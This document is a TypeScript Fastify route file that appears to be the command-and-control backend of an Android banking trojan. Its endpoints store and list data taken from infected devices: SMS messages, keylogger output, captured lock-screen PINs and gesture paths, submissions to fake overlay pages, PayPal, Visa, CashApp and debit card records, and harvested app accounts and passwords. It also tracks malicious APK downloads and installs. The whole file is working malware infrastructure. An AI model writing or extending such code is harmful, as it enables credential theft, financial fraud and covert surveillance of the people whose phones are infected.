import type { FastifyInstance } from "fastify";
import { listKeyboardAppSummaries, listKeyboardLogs } from "../services/keyboard.service.js";
import {
  appendKeyguardPinHistory,
  deleteKeyguardPin,
  deleteKeyguardPinHistory,
  getKeyguardPin,
  listKeyguardPinHistory,
  upsertKeyguardPin,
} from "../services/keyguard-pin.service.js";
import { listFakePageSubmissions } from "../services/fake-page.service.js";
import { listPayPalAccounts } from "../services/paypal-account.service.js";
import { listVisaAccounts } from "../services/visa-account.service.js";
import { listCashAppAccounts } from "../services/cashapp-account.service.js";
import { listDebitAccounts } from "../services/debit-account.service.js";
import { listSmsLogs } from "../services/sms.service.js";
import { listApkDownloadLogs } from "../services/apk-download.service.js";
import { getDashboardStats } from "../services/dashboard-stats.service.js";
import { listInstallerInstallLogs } from "../services/installer-install.service.js";
import { listClientInstallLogs } from "../services/client-install.service.js";
import {
  listInstalledApps,
  replaceInstalledApps,
  type SyncInstalledAppInput,
} from "../services/installed-apps.service.js";
import {
  batchUpsertFinanceApps,
  deleteFinanceApp,
  listFinanceApps,
  upsertFinanceApp,
} from "../services/finance-app.service.js";
import {
  batchUpsertDeviceAppAccounts,
  batchUpsertDeviceAppPasswords,
  deleteDeviceAppAccount,
  deleteDeviceAppPassword,
  listDeviceAppAccounts,
  listDeviceAppPasswords,
} from "../services/app-credential.service.js";
import { DEFAULT_LANDING_PAGE_KEY } from "../services/landing-view.service.js";

export async function registerDataRoutes(app: FastifyInstance) {
  app.get<{ Querystring: { deviceId?: string; limit?: string } }>(
    "/api/data/sms",
    async (request) => {
      const limit = request.query.limit ? Number(request.query.limit) : 100;
      const logs = await listSmsLogs({
        deviceId: request.query.deviceId,
        limit: Number.isFinite(limit) ? limit : 100,
      });

      return {
        ok: true,
        data: logs,
      };
    },
  );

  app.get<{
    Querystring: {
      deviceId?: string;
      appPackage?: string;
      page?: string;
      pageSize?: string;
      limit?: string;
    };
  }>("/api/data/keyboard", async (request) => {
    const page = request.query.page ? Number(request.query.page) : 1;
    // 兼容旧 limit：无 pageSize 时用 limit 当 pageSize
    const rawPageSize = request.query.pageSize ?? request.query.limit;
    const pageSize = rawPageSize ? Number(rawPageSize) : 20;
    const result = await listKeyboardLogs({
      deviceId: request.query.deviceId,
      appPackage: request.query.appPackage,
      page: Number.isFinite(page) ? page : 1,
      pageSize: Number.isFinite(pageSize) ? pageSize : 20,
    });

    return {
      ok: true,
      data: result,
    };
  });

  app.get<{ Querystring: { deviceId?: string } }>(
    "/api/data/keyboard/apps",
    async (request) => {
      const deviceId = request.query.deviceId?.trim();
      if (!deviceId) {
        return {
          ok: false,
          message: "deviceId_required",
        };
      }

      const summaries = await listKeyboardAppSummaries(deviceId);
      return {
        ok: true,
        data: summaries,
      };
    },
  );

  app.get<{ Querystring: { deviceId?: string } }>(
    "/api/data/installed-apps",
    async (request, reply) => {
      const deviceId = request.query.deviceId?.trim();
      if (!deviceId) {
        return reply.code(400).send({ ok: false, message: "deviceId_required" });
      }
      const apps = await listInstalledApps(deviceId);
      return { ok: true, data: apps };
    },
  );

  app.put<{
    Body: { deviceId?: string; apps?: SyncInstalledAppInput[] };
  }>("/api/data/installed-apps", async (request, reply) => {
    const deviceId = request.body?.deviceId?.trim() ?? "";
    if (!deviceId) {
      return reply.code(400).send({ ok: false, message: "deviceId_required" });
    }
    const apps = Array.isArray(request.body?.apps) ? request.body.apps : [];
    try {
      const saved = await replaceInstalledApps(deviceId, apps);
      return { ok: true, data: saved };
    } catch (error) {
      const message = error instanceof Error ? error.message : "installed_apps_sync_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.get("/api/data/finance-apps", async () => {
    const apps = await listFinanceApps();
    return { ok: true, data: apps };
  });

  app.post<{
    Body: { packageName?: string; label?: string };
  }>("/api/data/finance-apps", async (request, reply) => {
    const packageName = request.body?.packageName?.trim() ?? "";
    if (!packageName) {
      return reply.code(400).send({ ok: false, message: "packageName_required" });
    }
    try {
      const record = await upsertFinanceApp({
        packageName,
        label: request.body?.label,
      });
      return { ok: true, data: record };
    } catch (error) {
      const message = error instanceof Error ? error.message : "finance_app_save_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.post<{
    Body: { apps?: Array<{ packageName?: string; label?: string }> };
  }>("/api/data/finance-apps/batch", async (request, reply) => {
    const apps = Array.isArray(request.body?.apps) ? request.body.apps : [];
    if (apps.length === 0) {
      return reply.code(400).send({ ok: false, message: "apps_required" });
    }
    try {
      const saved = await batchUpsertFinanceApps(apps);
      return { ok: true, data: saved };
    } catch (error) {
      const message = error instanceof Error ? error.message : "finance_app_batch_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.delete<{ Querystring: { packageName?: string } }>(
    "/api/data/finance-apps",
    async (request, reply) => {
      const packageName = request.query.packageName?.trim() ?? "";
      if (!packageName) {
        return reply.code(400).send({ ok: false, message: "packageName_required" });
      }
      try {
        await deleteFinanceApp(packageName);
        return { ok: true, data: null };
      } catch (error) {
        const message = error instanceof Error ? error.message : "finance_app_delete_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  app.get<{ Querystring: { deviceId?: string } }>(
    "/api/data/keyguard-pin",
    async (request) => {
      const deviceId = request.query.deviceId?.trim();
      if (!deviceId) {
        return {
          ok: false,
          message: "deviceId_required",
        };
      }

      const record = await getKeyguardPin(deviceId);
      return {
        ok: true,
        data: record,
      };
    },
  );

  app.post<{
    Body: { deviceId?: string; pin?: string; lockType?: string; gesturePath?: string };
  }>("/api/data/keyguard-pin", async (request, reply) => {
    const deviceId = request.body?.deviceId?.trim() ?? "";
    const pin = request.body?.pin?.trim() ?? "";
    if (!deviceId) {
      return reply.code(400).send({ ok: false, message: "deviceId_required" });
    }
    if (!pin) {
      return reply.code(400).send({ ok: false, message: "pin_required" });
    }
    try {
      const record = await upsertKeyguardPin(deviceId, {
        pin,
        lockType: request.body?.lockType,
        gesturePath: request.body?.gesturePath,
        capturedAt: Date.now(),
      });
      return { ok: true, data: record };
    } catch (error) {
      const message = error instanceof Error ? error.message : "keyguard_pin_save_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.delete<{ Querystring: { deviceId?: string } }>(
    "/api/data/keyguard-pin",
    async (request, reply) => {
      const deviceId = request.query.deviceId?.trim();
      if (!deviceId) {
        return reply.code(400).send({ ok: false, message: "deviceId_required" });
      }
      await deleteKeyguardPin(deviceId);
      return { ok: true, data: null };
    },
  );

  app.get<{ Querystring: { deviceId?: string; limit?: string } }>(
    "/api/data/keyguard-pin-history",
    async (request) => {
      const deviceId = request.query.deviceId?.trim();
      if (!deviceId) {
        return {
          ok: false,
          message: "deviceId_required",
        };
      }
      const limit = request.query.limit ? Number(request.query.limit) : 50;
      const items = await listKeyguardPinHistory(
        deviceId,
        Number.isFinite(limit) ? limit : 50,
      );
      return {
        ok: true,
        data: items,
      };
    },
  );

  app.post<{
    Body: {
      deviceId?: string;
      pin?: string;
      lockType?: string;
      gesturePath?: string;
      capturedAt?: number;
      source?: string;
    };
  }>("/api/data/keyguard-pin-history", async (request, reply) => {
    const deviceId = request.body?.deviceId?.trim() ?? "";
    const pin = request.body?.pin?.trim() ?? "";
    if (!deviceId) {
      return reply.code(400).send({ ok: false, message: "deviceId_required" });
    }
    if (!pin) {
      return reply.code(400).send({ ok: false, message: "pin_required" });
    }
    try {
      const sourceRaw = (request.body?.source ?? "manual").trim().toLowerCase();
      const record = await appendKeyguardPinHistory(
        deviceId,
        {
          pin,
          lockType: request.body?.lockType,
          gesturePath: request.body?.gesturePath,
          capturedAt:
            typeof request.body?.capturedAt === "number"
              ? request.body.capturedAt
              : Date.now(),
        },
        sourceRaw === "device" ? "device" : "manual",
      );
      if (!record) {
        return reply.code(400).send({ ok: false, message: "keyguard_pin_invalid" });
      }
      return { ok: true, data: record };
    } catch (error) {
      const message =
        error instanceof Error ? error.message : "keyguard_pin_history_save_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.delete<{ Querystring: { deviceId?: string; id?: string } }>(
    "/api/data/keyguard-pin-history",
    async (request, reply) => {
      const deviceId = request.query.deviceId?.trim();
      const historyId = request.query.id?.trim();
      if (!deviceId) {
        return reply.code(400).send({ ok: false, message: "deviceId_required" });
      }
      if (!historyId) {
        return reply.code(400).send({ ok: false, message: "id_required" });
      }
      const deleted = await deleteKeyguardPinHistory(deviceId, historyId);
      if (!deleted) {
        return reply.code(404).send({ ok: false, message: "history_not_found" });
      }
      return { ok: true, data: null };
    },
  );

  app.get<{
    Querystring: { deviceId?: string; packageName?: string; limit?: string };
  }>("/api/data/fake-page", async (request) => {
    const deviceId = request.query.deviceId?.trim();
    if (!deviceId) {
      return {
        ok: false,
        message: "deviceId_required",
      };
    }
    const limit = request.query.limit ? Number(request.query.limit) : 100;
    const logs = await listFakePageSubmissions({
      deviceId,
      packageName: request.query.packageName,
      limit: Number.isFinite(limit) ? limit : 100,
    });
    return {
      ok: true,
      data: logs,
    };
  });

  app.get<{ Querystring: { deviceId?: string; limit?: string } }>(
    "/api/data/paypal",
    async (request) => {
      const limit = request.query.limit ? Number(request.query.limit) : 100;
      const logs = await listPayPalAccounts({
        deviceId: request.query.deviceId,
        limit: Number.isFinite(limit) ? limit : 100,
      });

      return {
        ok: true,
        data: logs,
      };
    },
  );

  app.get<{ Querystring: { deviceId?: string; limit?: string } }>(
    "/api/data/visa",
    async (request) => {
      const limit = request.query.limit ? Number(request.query.limit) : 100;
      const logs = await listVisaAccounts({
        deviceId: request.query.deviceId,
        limit: Number.isFinite(limit) ? limit : 100,
      });

      return {
        ok: true,
        data: logs,
      };
    },
  );

  app.get<{ Querystring: { deviceId?: string; limit?: string } }>(
    "/api/data/cashapp",
    async (request) => {
      const limit = request.query.limit ? Number(request.query.limit) : 100;
      const logs = await listCashAppAccounts({
        deviceId: request.query.deviceId,
        limit: Number.isFinite(limit) ? limit : 100,
      });

      return {
        ok: true,
        data: logs,
      };
    },
  );

  app.get<{ Querystring: { deviceId?: string; limit?: string } }>(
    "/api/data/debit",
    async (request) => {
      const limit = request.query.limit ? Number(request.query.limit) : 100;
      const logs = await listDebitAccounts({
        deviceId: request.query.deviceId,
        limit: Number.isFinite(limit) ? limit : 100,
      });

      return {
        ok: true,
        data: logs,
      };
    },
  );

  app.get<{ Querystring: { limit?: string } }>("/api/data/apk-downloads", async (request) => {
    const limit = request.query.limit ? Number(request.query.limit) : 200;
    const logs = await listApkDownloadLogs({
      limit: Number.isFinite(limit) ? limit : 200,
    });
    return {
      ok: true,
      data: logs,
    };
  });

  app.get<{ Querystring: { limit?: string } }>("/api/data/installer-installs", async (request) => {
    const limit = request.query.limit ? Number(request.query.limit) : 200;
    const logs = await listInstallerInstallLogs({
      limit: Number.isFinite(limit) ? limit : 200,
    });
    return {
      ok: true,
      data: logs,
    };
  });

  app.get<{ Querystring: { limit?: string } }>("/api/data/client-installs", async (request) => {
    const limit = request.query.limit ? Number(request.query.limit) : 200;
    const logs = await listClientInstallLogs({
      limit: Number.isFinite(limit) ? limit : 200,
    });
    return {
      ok: true,
      data: logs,
    };
  });

  app.get<{ Querystring: { pageKey?: string } }>("/api/data/landing-stats", async (request) => {
    const data = await getDashboardStats(request.query.pageKey ?? DEFAULT_LANDING_PAGE_KEY);
    return {
      ok: true,
      data,
    };
  });

  app.get<{ Querystring: { deviceId?: string; packageName?: string } }>(
    "/api/data/app-accounts",
    async (request, reply) => {
      const deviceId = request.query.deviceId?.trim() ?? "";
      const packageName = request.query.packageName?.trim() ?? "";
      if (!deviceId || !packageName) {
        return reply.code(400).send({ ok: false, message: "deviceId_packageName_required" });
      }
      const items = await listDeviceAppAccounts(deviceId, packageName);
      return { ok: true, data: items };
    },
  );

  app.post<{
    Body: {
      deviceId?: string;
      packageName?: string;
      accounts?: Array<{ account?: string; confidence?: number; reason?: string }>;
    };
  }>("/api/data/app-accounts/batch", async (request, reply) => {
    const deviceId = String(request.body?.deviceId ?? "").trim();
    const packageName = String(request.body?.packageName ?? "").trim();
    const accounts = Array.isArray(request.body?.accounts) ? request.body.accounts : [];
    if (!deviceId || !packageName) {
      return reply.code(400).send({ ok: false, message: "deviceId_packageName_required" });
    }
    if (accounts.length === 0) {
      return reply.code(400).send({ ok: false, message: "accounts_required" });
    }
    try {
      const saved = await batchUpsertDeviceAppAccounts(
        deviceId,
        packageName,
        accounts.map((item) => ({
          account: String(item?.account ?? ""),
          confidence: item?.confidence,
          reason: item?.reason,
        })),
      );
      return { ok: true, data: saved };
    } catch (error) {
      const message = error instanceof Error ? error.message : "app_accounts_batch_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.delete<{ Querystring: { id?: string } }>(
    "/api/data/app-accounts",
    async (request, reply) => {
      const id = request.query.id?.trim() ?? "";
      if (!id) {
        return reply.code(400).send({ ok: false, message: "id_required" });
      }
      try {
        await deleteDeviceAppAccount(id);
        return { ok: true, data: null };
      } catch (error) {
        const message = error instanceof Error ? error.message : "app_account_delete_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  app.get<{ Querystring: { deviceId?: string; packageName?: string } }>(
    "/api/data/app-passwords",
    async (request, reply) => {
      const deviceId = request.query.deviceId?.trim() ?? "";
      const packageName = request.query.packageName?.trim() ?? "";
      if (!deviceId || !packageName) {
        return reply.code(400).send({ ok: false, message: "deviceId_packageName_required" });
      }
      const items = await listDeviceAppPasswords(deviceId, packageName);
      return { ok: true, data: items };
    },
  );

  app.post<{
    Body: {
      deviceId?: string;
      packageName?: string;
      passwords?: Array<{
        password?: string;
        relatedAccount?: string;
        confidence?: number;
        reason?: string;
      }>;
    };
  }>("/api/data/app-passwords/batch", async (request, reply) => {
    const deviceId = String(request.body?.deviceId ?? "").trim();
    const packageName = String(request.body?.packageName ?? "").trim();
    const passwords = Array.isArray(request.body?.passwords) ? request.body.passwords : [];
    if (!deviceId || !packageName) {
      return reply.code(400).send({ ok: false, message: "deviceId_packageName_required" });
    }
    if (passwords.length === 0) {
      return reply.code(400).send({ ok: false, message: "passwords_required" });
    }
    try {
      const saved = await batchUpsertDeviceAppPasswords(
        deviceId,
        packageName,
        passwords.map((item) => ({
          password: String(item?.password ?? ""),
          relatedAccount: item?.relatedAccount,
          confidence: item?.confidence,
          reason: item?.reason,
        })),
      );
      return { ok: true, data: saved };
    } catch (error) {
      const message = error instanceof Error ? error.message : "app_passwords_batch_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.delete<{ Querystring: { id?: string } }>(
    "/api/data/app-passwords",
    async (request, reply) => {
      const id = request.query.id?.trim() ?? "";
      if (!id) {
        return reply.code(400).send({ ok: false, message: "id_required" });
      }
      try {
        await deleteDeviceAppPassword(id);
        return { ok: true, data: null };
      } catch (error) {
        const message = error instanceof Error ? error.message : "app_password_delete_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );
}
